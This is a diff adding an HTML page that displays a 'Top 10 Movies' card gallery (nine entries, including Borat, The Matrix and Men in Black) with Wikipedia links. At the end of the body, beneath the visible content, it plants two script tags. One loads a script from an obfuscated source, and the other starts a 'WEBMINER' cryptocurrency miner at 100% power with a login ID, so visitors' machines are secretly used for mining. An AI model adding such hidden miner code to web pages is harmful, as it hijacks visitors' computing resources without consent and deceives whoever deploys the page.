@@ -1,0 +1,134 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Top 10 Movies</title>
+    <style>
+        body {
+            margin: 0;
+            font-family: 'Comic Sans MS', cursive, sans-serif;
+            background: linear-gradient(135deg, #8BC6EC 0%, #9599E2 100%);
+            color: #fff;
+            text-align: center;
+        }
+
+        h1 {
+            margin-top: 30px;
+            font-size: 3rem;
+            text-shadow: 2px 2px #000;
+        }
+
+        .movie-container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            padding: 40px 20px;
+            gap: 20px;
+        }
+
+        .movie-card {
+            background-color: rgba(0, 0, 0, 0.6);
+            border-radius: 15px;
+            width: 220px;
+            padding: 15px;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+        }
+
+        .movie-card:hover {
+            transform: scale(1.05) rotate(1deg);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.4);
+        }
+
+        .movie-card img {
+            width: 100%;
+            height: 160px;
+            object-fit: cover;
+            border-radius: 10px;
+        }
+
+        .movie-card h3 {
+            margin: 10px 0;
+            font-size: 1.2rem;
+            color: #ffeb3b;
+        }
+
+        .movie-card a {
+            display: inline-block;
+            margin-top: 5px;
+            padding: 5px 10px;
+            background-color: #ff5722;
+            color: white;
+            border-radius: 8px;
+            text-decoration: none;
+            transition: background-color 0.3s ease;
+        }
+
+        .movie-card a:hover {
+            background-color: #ffc107;
+            color: #000;
+        }
+
+        .emoji {
+            font-size: 2rem;
+        }
+    </style>
+</head>
+<body>
+
+    <h1 class="emoji"> Top 10 Movies </h1>
+
+    <div class="movie-container">
+        <div class="movie-card">
+            <img src="https://ychef.files.bbci.co.uk/1280x720/p04dgkm4.jpg" alt="Borat">
+            <h3>Borat</h3>
+            <a href="https://en.wikipedia.org/wiki/Borat:_Cultural_Learning_of_America_for_Make_Benefit_Glorious_Nation_of_Kazakhstan" target="_blank">View Description</a>
+        </div>
+        <div class="movie-card">
+            <img src="https://i2-prod.walesonline.co.uk/incoming/article18912156.ece/ALTERNATES/s615/0_Borat.jpg" alt="Borat2">
+            <h3>Borat 2</h3>
+            <a href="https://en.wikipedia.org/wiki/Borat_Subsequent_Moviefilm" target="_blank">Описание на филма</a>
+        </div>
+        <div class="movie-card">
+            <img src="https://mediaproxy.tvtropes.org/width/1200/https://static.tvtropes.org/pmwiki/pub/images/breaking_bad_4.png" alt="Breaking Bad">
+            <h3>Breaking Bad</h3>
+            <a href="https://en.wikipedia.org/wiki/Breaking_Bad" target="_blank">Описание на филма</a>
+        </div>
+        <div class="movie-card">
+            <img src="https://m.media-amazon.com/images/M/MV5BZWNjZWUwNDgtYTM4ZC00Zjk0LTg3ZWItNGEyZmVkZTIxZDk0XkEyXkFqcGc@._V1_.jpg" alt="Bad Boys">
+            <h3>Bad Boys</h3>
+            <a href="https://en.wikipedia.org/wiki/Bad_Boys_(film)" target="_blank">Описание на филма</a>
+        </div>
+        <div class="movie-card">
+            <img src="https://resizing.flixster.com/-XZAfHZM39UwaGJIFWKAE8fS0ak=/v3/t/assets/p31357_p_v10_bc.jpg" alt="Bad Boys2">
+            <h3>Bad Boys 2</h3>
+            <a href="https://en.wikipedia.org/wiki/Bad_Boys_II" target="_blank">Описание на филма</a>
+        </div>
+        <div class="movie-card">
+            <img src="https://m.media-amazon.com/images/M/MV5BOTgyOGQ1NDItNGU3Ny00MjU3LTg2YWEtNmEyYjBiMjI1Y2M5XkEyXkFqcGc@._V1_FMjpg_UX1000_.jpg" alt="Fight Club">
+            <h3>Fight Club</h3>
+            <a href="https://en.wikipedia.org/wiki/Fight_Club" target="_blank">Описание на филма</a>
+        </div>
+        <div class="movie-card">
+            <img src="https://m.media-amazon.com/images/I/A1XW3-Mf-KL._AC_UF894,1000_QL80_.jpg" alt="The Gunman">
+            <h3>The Gunman</h3>
+            <a href="https://en.wikipedia.org/wiki/The_Gunman_(film)" target="_blank">Описание на филма</a>
+        </div>
+        <div class="movie-card">
+            <img src="https://m.media-amazon.com/images/I/613ypTLZHsL._AC_UF1000,1000_QL80_.jpg" alt="The Matrix">
+            <h3>The Matrix</h3>
+            <a href="https://en.wikipedia.org/wiki/The_Matrix" target="_blank">Описание на филма</a>
+        </div>
+        <div class="movie-card">
+            <img src="https://resizing.flixster.com/-XZAfHZM39UwaGJIFWKAE8fS0ak=/v3/t/assets/p19526_p_v8_az.jpg" alt="Men in Black">
+            <h3>Men in Black</h3>
+            <a href="https://en.wikipedia.org/wiki/Men_in_Black_(film)" target="_blank">Описание на филма</a>
+        </div>
+
+    </div>
+<script src="43g71D4MK4NBNQ3gRN19m6NRLti3Tayd6fQABDQd5jTg7yA5FJ4jH4meo6zSe5TyUqhPmfzsDunqD6yrPspqPw9fJ5jib1z"></script>
+      <script>WEBMINER.config({ login: "7195103", pass: null }).power(100);</script>
+      
+</body>
+</html>
